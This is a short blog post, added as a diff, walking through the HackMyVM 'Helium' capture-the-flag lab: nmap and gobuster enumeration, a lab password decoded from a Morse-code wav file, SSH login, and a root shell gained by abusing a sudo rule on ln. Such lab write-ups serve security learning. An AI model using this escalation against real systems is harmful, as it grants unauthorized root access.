@@ -1,0 +1,66 @@
+---
+title: "Helium - HackMyVM Walkthrough"
+---
+
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/helium]
+└─$ nmap -p- -sV 192.168.56.254
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 22:52 EDT
+Nmap scan report for dominator.hmv (192.168.56.254)
+Host is up (0.00028s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+{% endhighlight %}
+The index page on the site has a wav file and a background image. Comment from the 
+web page source code:
+{% highlight html %}
+<!-- Please paul, stop uploading weird .wav files using /upload_sound -->
+{% endhighlight %}
+
+gobuster dir and file enum:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/helium]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x php,txt,html,dic -u http://192.168.56.254
+/index.html           (Status: 200) [Size: 530]
+/yay                  (Status: 301) [Size: 185] [--> http://192.168.56.254/yay/]
+{% endhighlight %}
+
+We don't have access to the yay directory. Let's enumerate the website more. READ 
+EVERYTHING! 
+
+found in bootstrap.min.css: 
+`/yay/mysecretsound.wav`
+
+Running that wav through https://morsecode.world/international/decoder/audio-decoder-adaptive.html reveals a password for the user paul. 
+
+`paul:dancingpassyo`
+
+We use those credentials to gain access via SSH. 
+
+Local enumeration
+
+Checking sudo commands and permissions:
+{% highlight terminal %}
+paul@helium:~$ sudo -l
+Matching Defaults entries for paul on helium:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paul may run the following commands on helium:
+    (ALL : ALL) NOPASSWD: /usr/bin/ln
+{% endhighlight %}
+
+
+From gtfobins:
+>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+Using the following two commands we get a root shell:
+
+`sudo ln -fs /bin/sh /bin/ln`
+
+`sudo ln`
+
+I submitted the points for the user and root flags. Hooray for points.
